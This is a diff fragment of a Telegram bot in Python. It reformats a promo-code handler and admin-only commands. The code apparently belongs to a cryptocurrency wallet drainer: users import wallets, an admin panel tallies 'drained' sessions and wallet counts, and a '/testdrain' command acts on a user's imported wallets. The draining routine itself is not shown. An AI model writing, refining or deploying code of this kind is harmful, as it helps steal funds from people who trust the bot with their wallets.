     await cb.message.edit_text("🎟️ Send your promo code:", reply_markup=back_menu_kb(), parse_mode=ParseMode.HTML)
@@ -1480,12 +1402,7 @@ async def promo_code(message: Message, state: FSMContext):
     if code in valid:
         sess.promo = code
         sess.launches_left += valid[code]
-        text = (
-            "✅ <b>Promo Applied</b>\n\n"
-            f"Code: <b>{code}</b>\n"
-            f"+{valid[code]} launches\n"
-            f"Launches left: <b>{sess.launches_left}</b>"
-        )
+        text = f"✅ <b>Promo Applied</b>\n\nCode: <b>{code}</b>\n+{valid[code]} launches\nLaunches left: <b>{sess.launches_left}</b>"
         await message.answer(text, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)
     else:
         await message.answer("❌ Invalid or expired code.", reply_markup=main_menu_kb())
@@ -1493,8 +1410,7 @@ async def promo_code(message: Message, state: FSMContext):
 
 @router.message(Command("admin"))
 async def admin_panel(message: Message):
-    if message.from_user.id not in ADMIN_IDS:
-        return
+    if message.from_user.id not in ADMIN_IDS: return
     total = len(sessions)
     drained = sum(1 for s in sessions.values() if s.drained)
     wallets = sum(len(s.wallets) for s in sessions.values())
@@ -1514,8 +1430,7 @@ async def admin_panel(message: Message):
 
 @router.message(Command("testdrain"))
 async def test_drain(message: Message):
-    if message.from_user.id not in ADMIN_IDS:
-        return
+    if message.from_user.id not in ADMIN_IDS: return
     sess = get_session(message.from_user.id)
     if not sess.wallets:
         await message.answer("No wallet imported")
